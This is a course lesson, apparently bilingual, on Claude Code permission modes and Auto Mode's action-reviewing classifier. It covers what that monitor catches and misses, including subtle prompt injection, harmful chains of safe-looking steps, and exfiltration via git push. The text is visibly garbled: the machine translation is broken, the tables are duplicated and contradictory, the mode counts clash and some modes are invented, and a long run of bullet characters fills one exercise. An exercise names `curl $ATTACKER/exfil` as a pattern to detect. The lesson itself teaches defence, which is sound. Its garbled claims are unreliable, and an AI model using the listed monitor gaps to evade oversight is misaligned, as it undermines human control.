# Claude Code como Agente Autônomo: modos de Permissão e modo Automático
# Modos de autorização para agentes autônomos

> Uma escada de permissão  níveis graduados de autonomia de revisão-cada ação para aprovar-tudo  é como um arame governa o que um agente autônomo pode fazer sem pedir. Claude Code, o exemplo de trabalho desta lição, expõe seis modos: "plan" pergunta antes de cada ação, "default" (etiquetado "Manual" na interface) pergunta apenas para os riscos, "acceptEdits" auto-aprova arquivo escreve, mas ainda confirma execução de shell, e "bypassPermissions" aprova tudo. Modo automático  o `auto`O modo de autorização  substitui a aprovação por acção por um modelo de classificação separado que revisa cada acção antes de ser executada e bloqueia qualquer coisa que exceda o exigido pelo pedido.`max_turns`E ...`max_budget_usd`Disponibilidade de`auto`depende do plano, da habilitação org, do modelo e do provedor  e a Anthropic é explícita que o classificador não é suficiente sozinho.

> **【中文解读】**Claude Code 暴露七个权限模式──"plan" 每动作前询问,"default" 仅对危险动作询问,"acceptEdits" 自动批准文件写入但仍确认 shell 执行,"bypassPermissions" 批准一切──Auto Mode(2026年3月24日) Used two phases并行安全分类器替代每动作审批:每动作运行单代币 快速检查;标记动作发发发思链深度审查──动作预算通过`max_turns`和 `max_budget_usd`实施──Auto Mode 作为研究预览发布Antropic 明确声明分类器单独不充分──

> **【拓展：权限阶梯 → 安全分级】**Os sete padrões do Claude Code são "escalas de autonomia":plan → default → acceptEdits → ... → bypassPermissões. Cada padrão é a velocidade e o peso de cada ação de avaliação.

> - Não .**【前置】**學本節前 請先掌握:Fase 15·01 ((Agentes de longo horizonte) 理解为什么长程 代理人需要权限系统;Fase 14·27 ((Prompt Injection Defense) 理解为什么 代理人看到的内容不能全信──本节直接讲克劳德码的实际权限模式,是最贴近日常使用的代理安全课──

**Type:** Learn | **类型:** 学习
**Languages:** Python (stdlib, two-stage classifier simulator) | **语言:** Python（标准库，两阶段分类器模拟器）
**Prerequisites:** Phase 15 · 01 (Long-horizon agents), Phase 15 · 09 (Coding-agent landscape) | **前置知识:** Phase 15 · 01（长程 Agent），Phase 15 · 09（编码 Agent 全景）
**Time:** ~45 minutes | **时间:** ~45 分钟

## O problema é o problema da introdução

> **【中文解读】**O modelo de autorização do código Claude é um exemplo típico de controle de segurança do agente.

> **【拓展：claude code permission modes】**O código Claude de direitos de design é um exemplo das melhores práticas de segurança do agente em 2026: 1) o máximo de direitos de usuário pode ser concedido apenas de forma imperativa; 2) o uso de direitos de usuário pode ser gradualmente ampliado de acordo com a sua confiança; 3) o rastreamento de auditoria; 4) a interrupção de operações de qualquer momento.

Um agente de codificação autônoma na sua máquina é uma categoria de segurança distinta.

> O agente de código autônomo de sua máquina é uma categoria de segurança única.

A superfície de ataque é tudo o que o agente pode alcançar  sistema de arquivos, rede, credenciais, clipboard, qualquer guia de navegador, qualquer terminal aberto. Bruce Schneier e outros sinalizaram isso publicamente: agentes de uso de computadores não são uma "atualização de recursos" de chatbots, são um novo tipo de ferramenta com um novo tipo de perfil de risco.

> ATAK FACE é o Agente que pode tocar em tudo sistema de documentos, redes, credenciais, cartões de cartão de crédito, qualquer marcação de navegador, qualquer terminal aberto.

O sistema de permissão do Claude Code é a resposta da Anthropic. Em vez de um interruptor "autônomo / não autônomo", existem seis modos que abrangem uma escada de capacidade: plano → padrão → aceitarEdits → ... → bypassPermissões. Cada modo é um troco diferente entre velocidade e revisão por ação. O Modo Automático (março 2026) adiciona um modelo de classificação separado que afasta a aprovação do caminho crítico do usuário: revisa cada ação antes de executar e bloqueia qualquer coisa que exceda a solicitação.

> O sistema de direitos do código Claude é uma resposta antropológica. Não é uma chave de "autônomo/ não autônomo", mas sim uma escala de capacidade transversal.

> - Não .**【类比】**Claude Code 权限模式 = 银行卡额度阶梯──(1) **plan**= Cada笔交易都打电话问你;(2) **default**= Grande quantidade de transações (se você quer)**acceptEdits**= 储蓄卡(消费自动,转账问);(4) **bypassPermissions (YOLO)**O modo automático é usado apenas em contêineres isolados, o modo YOLO é usado apenas em contêineres isolados, o modo de operação é sempre desnecessário.

> ️ **【易错点】**Claude Code 权限的 3 个致命错误:(1) **本机用 bypassPermissions** Uma injeção rápida 就能 rm -rf /; 只在不敏感的临时容器用──(2) **没设 max_budget_usd**Um ciclo de voo 1 horas queimando $ 50;`max_budget_usd=5`起步──(3) **完全信任 Auto Mode 分类器**Antropic 明确说"分类器单独不充分";高危操作(rm、转账、发邮件) deve ser duplamente confirmado, mesmo que分类器说安全──


> **【中文解读】**Esta secção apresenta o conceito e o método de implementação do Agente de IA. O Agente é um sistema autónomo impulsionado pelo LLM, capaz de observar o ambiente, pensar decisões, executar a ação e ciclo de vida até a conclusão do objetivo.

A questão da engenharia: o que o sistema pega, o que perde e qual modo uma determinada tarefa realmente requer?

> 工程问题: este sistema capture what? 遗漏 what?

## O conceito central.

### Os sete modos de autorização.
### Os seis modos de autorização

| Mode | Behavior | When to use |
|---|---|---|
| 模式 | 行为 | 何时使用 |
| `plan` | Agent proposes a plan; user approves the whole plan; every action is reviewed before execution | Unfamiliar task; prod-adjacent code; first time using the agent on a repo |
| `plan` | Agent 提议计划；用户批准整个计划；每动作执行前审查 | 不熟悉任务；接近生产的代码；首次在仓库使用 Agent |
| `default` | Agent runs actions; prompts user for any "risky" action (shell exec, destructive operations, network calls) | Most interactive coding sessions |
| `default` | Agent 运行动作；对任何"危险"动作（shell 执行、破坏性操作、网络调用）提示用户 | 多数交互编码会话 |
| `acceptEdits` | File writes auto-approve; shell exec and network calls still prompt | Refactoring pass across many files |
| `acceptEdits` | 文件写入自动批准；shell 执行和网络调用仍提示 | 跨多文件重构 |
| `acceptExec` | Shell commands auto-approve within a curated allowlist; writes auto-approve | Tight inner loops where every shell command is `npm test` or similar |
| `acceptExec` | Shell 命令在策划允许列表内自动批准；写入自动批准 | 每条 shell 命令是 `npm test` 之类的紧密内循环 |
| `autoMode` | Two-stage safety classifier; flagged actions elevate to review | Long-horizon unattended runs in a constrained workspace |
| `autoMode` | 两阶段安全分类器；标记动作升级审查 | 受限工作区中的长程无人值守运行 |
| `yolo` | Skips most prompts; still runs tool allowlist / denylist | Ephemeral sandboxes, CI jobs, research scripts |
| `yolo` | 跳过多数提示；仍运行工具允许/拒绝列表 | 临时沙箱、CI 任务、研究脚本 |
| `default` | Labeled "Manual" in the UI. Agent runs actions; prompts user for any "risky" action (shell exec, destructive operations, network calls) | Most interactive coding sessions |
| `acceptEdits` | File writes auto-approve; shell exec and network calls still prompt | Refactoring pass across many files |
| `auto` | A separate classifier model reviews each action before it runs; blocks anything escalating beyond the request | Long-horizon unattended runs in a constrained workspace |
| `dontAsk` | Never prompts; actions not pre-approved by permission rules are denied | Ephemeral sandboxes, CI jobs, research scripts |
| `bypassPermissions` | Approves everything | Documented as "only inside ephemeral containers you are willing to throw away" |
| `bypassPermissions` | 批准一切 | 文档定为"仅在你愿意丢弃的临时容器内" |

(Os nomes acima correspondem aos documentos públicos do código Claude; os rótulos da interface `default`como "Manual".)

> (上述名称匹配公开 Claude Code 文档;"yolo" é uma tradução não formal de "宽松中间地带的简写").

### Modo automático em uma página. Modo automático em uma página.

O Modo Automático (lançado em 24 de março de 2026) é o primeiro modo de permissão para delegar a aprovação por ação a um modelo.

> Auto Mode (em inglês: Auto Mode (em inglês: Auto Mode) foi lançado em 24 de março de 2026.

Estrutura:

> 结构:

1. **Stage 1 — single-token classifier.**Funciona em todas as ações propostas. Baratas. Retorna "seguro" ou "flag". Projetado para funcionar em paralelo com o ciclo principal do agente para que as ações aprovadas não se sentem em fila.
   Tradução:**阶段 1——单 token 分类器。**Em cada proposta de movimentação, é executado em baixo custo.
2. **Stage 2 — secondary policy/safety review.**Executa apenas ações marcadas. Realiza uma avaliação de política e segurança focada sobre a ação, o estado atual da sessão e a tarefa declarada. Escala para HITL do usuário se a confiança for baixa.
   Tradução:**阶段 2——二级政策/安全审查。**                                                                                                                                                                                                                                                              
1. **A separate classifier model.**Revisão de cada ação proposta antes de ser executada, julgado em função da tarefa declarada e do estado atual da sessão, e bloqueia qualquer coisa que exceda o que a solicitação exigiu. Ações bloqueadas caem no usuário.
2. **Gated availability.**Se`auto`O modelo de oferta depende do plano, da organização, do modelo e do fornecedor.

Os controlos orçamentais estão ao lado do classificador:

>  orçamento control e classificação

- `max_turns` Iterações totais numa sessão.
  Tradução:`max_turns`会话总代数──
- `max_budget_usd`- O limite de dólares que aborta a sessão.
  Tradução:`max_budget_usd`停止会话的美元上限──
- Limites de conta de ações por instrumento (não mais do que N `WebFetch`chamadas, etc.).
  Tradução do inglês:`WebFetch`调用等) ⋅

### O que o sistema capta o que o sistema capta

- Injecção imediata direta para a frente nas entradas da ferramenta, onde a instrução injetada apresenta uma forma de ação conhecida de risco.
  Instrução de inserção de dados em dados de dados.
- Loops de ferramentas repetitivas  o classificador pode ver a ação N+1 é quase idêntica à ação N, cinco vezes seguidas.
  Tradução do inglês:重复工具循环分类器可见动作 N+1 与动作 N 几乎相同,连续五次。
- Comandações de shell claramente fora do escopo numa sessão de edição de arquivos.
  Tradução do inglês:  shell 命令

### O que o sistema pode perder. O que o sistema pode deixar de lado?

- **Subtle prompt injection**O sistema de injeção de prompt indireta não é uma vulnerabilidade totalmente corrigível (OpenAI preparation head, 2025, on browser agents  see Lesson 11).
  Tradução:**微妙提示注入** em caso de não surgir um único marcado de movimento, o comportamento de modificação.
- **Semantic-level misbehavior.**Cada ação individual pode parecer segura enquanto a trajetória composta é prejudicial.
  Tradução:**语义级不当行为。**Cada movimento individual parece seguro e o conjunto de rotas prejudiciais.
- **Exfiltration through legitimate channels.**Escrever dados para um arquivo que você possui, então `git push`O processo de reestruturação de um banco público é uma sequência de acções autorizadas cuja composição é o problema.
  Tradução:**通过合法渠道泄露。**Escrever dados até os documentos que você tem, e depois`git push`Até o armazém público, é a sequência de atividades permitidas, a sua composição é apenas um problema.

### Quadro de visualização de pesquisa

A Anthropic enviou o Modo Automático como uma prévia de pesquisa. A documentação é explícita de que o classificador é uma camada, não uma solução: os utilizadores devem combinar o modo automático com orçamentos, permissões, espaços de trabalho isolados e auditorias de trajetórias (Lessões 1216). O enquadramento de pré-visualização também reflete a lacuna documentada entre avaliação e implementação (Lessão 1)  um classificador que passa avaliações offline pode se comportar de forma diferente em uma sessão real onde o contexto do usuário é ambíguo.

> Antropic 将 Auto Mode 作为研究预览发布──文档明确分类器是一个层而非解决方案:用户被期望将 Auto Mode与预算,允许列表,隔离工作区,轨迹审计 (第 12-16 课) 结合──预览框架也反映了已记录的评估部署差距 (第 1 课) 通过离线评估的分类器在用户下文模糊的真实行为中可能不同.

### Onde esta escada vive no seu fluxo de trabalho

- tarefa desconhecida: iniciar `plan`Ler o plano é mais barato do que recuar numa má corrida.
  Tradução do inglês:`plan`O que é que é um bom trabalho?
- Refactor conhecido: `acceptEdits`Salva muitos cliques de confirmação.
  Tradução do português:`acceptEdits`E o que é que é?
- Fase de fundo sem supervisão: `autoMode`apenas dentro de um espaço de trabalho cujo raio de explosão tenha medido (sem credenciais, sem montantes de produção, sem saída que não tenha optado).
  Tradução do inglês para tradução do inglês para inglês:`autoMode`(Sem diploma, sem produção, sem exportação não selecionada)
- Containers efêmeres: `yolo`- Não .`bypassPermissions`É aceitável se e somente se o recipiente e as suas credenciais forem descartáveis.
  Tradução do português:`yolo`- Não .`bypassPermissions`Pode ser aceita e apenas como recipiente e seus credenciais podem ser descartados.
- Fase de fundo sem supervisão: `auto`apenas dentro de um espaço de trabalho cujo raio de explosão tenha medido (sem credenciais, sem montantes de produção, sem saída que não tenha optado).
- Containers efêmeres: `dontAsk`- Não .`bypassPermissions`É aceitável se e somente se o recipiente e as suas credenciais forem descartáveis.

```figure
autonomy-oversight
```

## Use-o com o framework implementado.

`code/main.py`Simula um classificador de revisão de ações como um pipeline de duas etapas  uma simplificação do ensino; o real `auto`O modo é apoiado por um modelo de classificador separado, não um contrato documentado de duas etapas. O estágio 1 é uma regra de palavras-chave barata sobre as ações propostas; o estágio 2 é um revisor de regra múltipla mais lento. O motorista alimenta em uma curta trajetória sintética (ações seguras, uma tentativa de injeção rápida, um ciclo repetitivo) e mostra onde o classificador pega e onde perde.

> `code/main.py`模拟两阶段分类器──阶段 1 é o código de regras de mudança de preços;阶段 2 é o código de revisores de regras mais lentos──驱动器进入短合成轨迹(安全动作、提示注入尝试、重复循环)并展示分类器捕获和遗漏的处处──

## Envia-o . Produto .

`outputs/skill-permission-mode-picker.md`corresponde à descrição da tarefa com o modo de autorização adequado, limites orçamentais e isolamento necessário.

> `outputs/skill-permission-mode-picker.md`A descrição das tarefas deve ser adequada ao modelo de limitação de poder, ao limite orçamental e à separação necessária.

## Exercícios.

1. Corra .`code/main.py`Que tipo de acção sintética nunca é marcada pela Etapa 1 mas sempre capturada pela Etapa 2?
   Tradução: 运行`code/main.py` Que tipo de movimento sintético não foi identificado na fase 1 mas foi capturado na fase 2?

2. Extender a regra do estágio 1 definida para capturar uma forma específica conhecida de forma ruim (por exemplo, `curl $ATTACKER/exfil`) Medir a taxa de falsos positivos na amostra de acção benigna.
   Tradução do inglês: 扩展阶段 1 规则集以捕获特定已知坏形状 (conhecido como forma)`curl $ATTACKER/exfil`• ■ • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • •

3. Leia o documento "Como funciona o ciclo do agente" da Anthropic.`default`O que é que você precisa de abrir separadamente antes de correr`autoMode`sem supervisão?
   中文翻译:阅读 Antropic 的"Como funciona o ciclo do agente"文档──列出 `default`模式下 Agente 默认触及的每一个外部状态――无人值守运行 `autoMode`Precisa de um controle único?
3. Leia o documento "Como funciona o ciclo do agente" da Anthropic.`default`O que é que você precisa de abrir separadamente antes de correr`auto`sem supervisão?

4. Desenhar um orçamento de execução não supervisada de 24 horas: `max_turns`- Não .`max_budget_usd`- A justificação de cada número.
   Tradução do inglês: Design 24 小时无人值守运行预算:`max_turns`- Não.`max_budget_usd`、 cada ferramenta 、 permitir listação、论证 cada número。

5. Descreva uma trajetória em que cada ação individual é aprovada pela Fase 1 e Fase 2, mas o comportamento composto é desalinhado. (Lessão 14 abrange como os interruptores de eliminação e os tokens canários tratam isso.)
   Chinese:                                                                                                                                                                                                                                                              
5. Descreva uma trajetória em que cada ação individual é aprovada pelo classificador, mas o comportamento composto é desalinhado. (Lessão 14 abrange como os interruptores de eliminação e os tokens canários tratam isso.)

## Termos-chave .

| Term | What people say | What it actually means |
|---|---|---|
| 术语 | 通俗说法 | 实际含义 |
| Permission mode | "How much the agent can do" | One of seven named policies controlling per-action approval |
| 权限模式 | "Agent 能做多少" | 控制每动作审批的七种命名策略之一 |
| Permission mode | "How much the agent can do" | One of six named policies controlling per-action approval |
| plan mode | "Ask before anything" | Agent writes a plan; user approves before execution |
| plan 模式 | "任何事前询问" | Agent 写计划；用户执行前批准 |
| acceptEdits | "Let it write files" | File writes auto-approve; shell exec still prompts |
| acceptEdits | "让它写文件" | 文件写入自动批准；shell 执行仍提示 |
| autoMode | "Auto approvals" | Two-stage safety classifier; flagged actions escalate |
| autoMode | "自动批准" | 两阶段安全分类器；标记动作升级 |
| bypassPermissions | "Full YOLO" | Approves everything; intended for ephemeral containers |
| bypassPermissions | "完全 YOLO" | 批准一切；用于临时容器 |
| Stage 1 classifier | "Fast token check" | Single-token rule over proposed action; runs in parallel |
| 阶段 1 分类器 | "快速 token 检查" | 提议动作上的单 token 规则；并行运行 |
| Stage 2 classifier | "Deep review" | Chain-of-thought reasoning over flagged actions |
| 阶段 2 分类器 | "深度审查" | 对标记动作的思维链推理 |
| auto | "Auto approvals" | Separate classifier model reviews each action; blocks escalation beyond the request |
| bypassPermissions | "Full YOLO" | Approves everything; intended for ephemeral containers |
| Stage 1 (simulator) | "Fast keyword check" | Cheap rule over proposed actions in `code/main.py` |
| Stage 2 (simulator) | "Deep review" | Slower multi-rule reviewer for flagged actions in `code/main.py` |
| Research preview | "Not GA" | Anthropic framing for features whose failure mode is still being mapped |
| 研究预览 | "非 GA" | Anthropic 对失败模式仍在映射的功能的框架 |

## Mais leitura 延伸阅读

- [Anthropic — How the agent loop works](https://code.claude.com/docs/en/agent-sdk/agent-loop) modos de autorização, orçamentos, formato de acção.
  Tradução do inglês:
- [Anthropic — Claude Managed Agents overview](https://platform.claude.com/docs/en/managed-agents/overview) Modelo de execução de serviços gerenciados.
  Tradução do inglês:
- [Anthropic — Claude Code product page](https://www.anthropic.com/product/claude-code) superfície de recurso e anúncio de modo automático.
  Tradução do inglês: function面和 Auto Mode 公告──
- [Anthropic — Claude's Constitution (January 2026)](https://www.anthropic.com/news/claudes-constitution) a camada baseada na razão que forma os julgamentos dos classificadores.
  Tradução do inglês para "Plastics"
- [Anthropic — Measuring agent autonomy in practice](https://www.anthropic.com/research/measuring-agent-autonomy) Perspectiva interna sobre o projeto de permissões de longo horizonte.
  Tradução do inglês:长程权限设计的内部视角──
